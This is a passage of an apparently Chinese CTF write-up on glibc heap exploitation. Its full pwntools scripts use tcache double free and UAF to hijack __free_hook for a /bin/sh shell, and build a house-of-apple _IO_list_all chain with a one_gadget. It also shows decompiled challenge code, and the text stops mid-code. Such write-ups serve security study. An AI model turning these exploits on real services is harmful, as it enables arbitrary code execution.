class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input index: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input index: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#add(0x80)#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x260</span></span><br><span class="line">tcache = heap_base + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(tcache))</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>, p8(<span class="number">0x7</span>)*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">5</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="思路2，参考Nameless-a"><a href="#思路2，参考Nameless-a" class="headerlink" title="思路2，参考Nameless_a"></a>思路2，参考<a href="https://bbs.kanxue.com/thread-274580.htm#msg_header_h3_0">Nameless_a</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 构造double free，泄露出heap_base的地址</span><br><span class="line">2. 不断释放同一个堆块（并修改bk指针），直至填满0x80的tcache并溢出一个至unsorted bin， 拿到libc_base</span><br><span class="line">3. 利用double free，劫持__free_hook</span><br></pre></td></tr></table></figure><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> r </span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="comment">##r=process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">    r=remote(<span class="string">&quot;1.14.97.218&quot;</span>,<span class="number">24360</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">## leak_heap</span></span><br><span class="line">    add(<span class="number">0x7f</span>)</span><br><span class="line">    add(<span class="number">0x7f</span>)</span><br><span class="line">    <span class="comment">##add(0x7f)</span></span><br><span class="line">    <span class="comment">##add(0x7f)</span></span><br><span class="line">    delet(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;nameless&quot;</span>)</span><br><span class="line">    <span class="comment">##z()</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;nameless&quot;</span>)</span><br><span class="line">    heapbase=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&quot;heapbase:&quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">##leak libc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">        edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">        delet(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">##z()</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    libcbase=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">    log.success(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">## set_libc func</span></span><br><span class="line">    free_hook=libcbase+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    system=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]   </span><br><span class="line"> </span><br><span class="line">    edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x7f</span>) <span class="comment">##,&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">    add(<span class="number">0x7f</span>) <span class="comment">##,p64(system))</span></span><br><span class="line">    edit(<span class="number">3</span>,p64(system))</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    <span class="comment">##z()</span></span><br><span class="line">    delet(<span class="number">0</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h2 id="libc2-31"><a href="#libc2-31" class="headerlink" title="libc2.31"></a>libc2.31</h2><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p><code>__free_hook</code>和<code>__malloc_hook</code>都还在，可以劫持。</p><h2 id="libc2-35"><a href="#libc2-35" class="headerlink" title="libc2.35"></a>libc2.35</h2><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p><code>libc2.34</code>之后的版本利用手法暂时无差别，<code>__free_hook</code>、<code>__malloc_hook</code>和<code>__realloc_hook</code>已被删除，基本是<code>IO</code>链利用的主场。</p><h3 id="UAF1"><a href="#UAF1" class="headerlink" title="UAF1"></a>UAF1</h3><p>例题信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">来源：柏鹭杯-note2</span><br><span class="line">libc版本：ubuntu2.35-0-3.1</span><br><span class="line">漏洞：UAF</span><br><span class="line">限制：堆块大小 &lt;= 0x200</span><br><span class="line">     堆块的id &lt;= 9</span><br></pre></td></tr></table></figure><p>MENU：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--- menu ---&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1) malloc&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2) free&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3) view&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4) leave&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ADD：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">op_malloc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  index = get_index();<span class="comment">//index&gt;10会跳出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size?&quot;</span>);</span><br><span class="line">  size = get_number();</span><br><span class="line">  <span class="keyword">if</span> ( !size || size &gt; <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Interesting...&quot;</span>);</span><br><span class="line">  *(&amp;chonks + index) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(*(&amp;chonks + index), size, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETE：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">op_free</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  index = get_index();</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;chonks + index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VIEW：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">op_view</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  index = get_index();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(&amp;chonks + index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LEAVE：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( number == <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.申请并释放0x80的堆块，填满tcache bin，溢出一个到unsorted bin，即可泄露出libc_base、heap_base</span><br><span class="line">2. 申请回所有释放的堆块</span><br><span class="line">3. 申请并释放0x70的堆块，填满tcache bin，溢出一个到fast bin，即可利用UAF申请到_IO_list_all，构造house of apple</span><br><span class="line">4. exit退出调用链</span><br></pre></td></tr></table></figure><h4 id="调试信息"><a href="#调试信息" class="headerlink" title="调试信息"></a>调试信息</h4><p>劫持<code> _IO_list_all</code> 为目标堆：<br><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311721220.png" alt="image-20230831172114112"></p><p>目标堆即<code>fake_IO_list_all</code>结构体构造如下：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311723014.png" alt="image-20230831172354945"></p><p>伪造的<code>_wide_data</code>结构体如下，其余值均为0，伪造了<code>_wide_vtable</code>：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311733446.png" alt="image-20230831173315327"></p><p>伪造的<code>_wide_vtable</code>结构体如下：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311735539.png" alt="image-20230831173542495"></p><p>最后通过<code>exit()</code>触发如下的链子：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311739977.png" alt="image-20230831173942904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">► f 0   0x7fa1a3283c14 _IO_wdoallocbuf+36</span><br><span class="line">  f 1   0x7fa1a3286675 _IO_wfile_overflow+613</span><br><span class="line">  f 2   0x7fa1a328ea42 _IO_flush_all_lockp+226</span><br><span class="line">  f 3   0x7fa1a328ebfe _IO_cleanup+46</span><br><span class="line">  f 4   0x7fa1a3245542 __run_exit_handlers+434</span><br><span class="line">  f 5   0x7fa1a3245610 on_exit</span><br><span class="line">  f 6   0x55e7639cc575 main+184</span><br><span class="line">  f 7   0x7fa1a3229d90 __libc_start_call_main+128</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Enter content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">view(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">0</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">_IO_file_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]</span><br><span class="line"><span class="comment"># stdout = libc_base + libc.sym[&quot;stdout&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">b&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">fake_IO_list_all_addr = heap_base + <span class="number">0xc30</span></span><br><span class="line">fake_IO_list_all = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)           <span class="comment">#_IO_write_ptr</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_list_all_addr + <span class="number">0xe0</span>)   <span class="comment">#fake _wide_data</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)  <span class="comment">#vtable</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xe0</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_list_all += p64(heap_base + <span class="number">0xe40</span>)  <span class="comment">#fake _wide_vtable</span></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, fake_IO_list_all)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&#x27;eee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, p64(_IO_list_all^key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, p64(fake_IO_list_all_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_vtable = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_wide_vtable = fake_wide_vtable.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(one_gadget)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, fake_wide_vtable)</span><br><span class="line">leave()</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="UAF2"><a href="#UAF2" class="headerlink" title="UAF2"></a>UAF2</h3><p>例题信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">来源：zjctf2022决赛-HodgePodge</span><br><span class="line">libc版本：ubuntu2.35-0-3</span><br><span class="line">漏洞：UAF</span><br><span class="line">限制：0x400 &lt; 堆块大小 &lt;= 0x430</span><br><span class="line">     堆块的id &lt;= 9</span><br><span class="line">     开了沙箱，orw读取flag</span><br></pre></td></tr></table></figure><p>ADD：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.del&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;&gt;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETE：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_144C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">  v0 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( chunk_list[v0] )</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EDIT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_13B6</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span 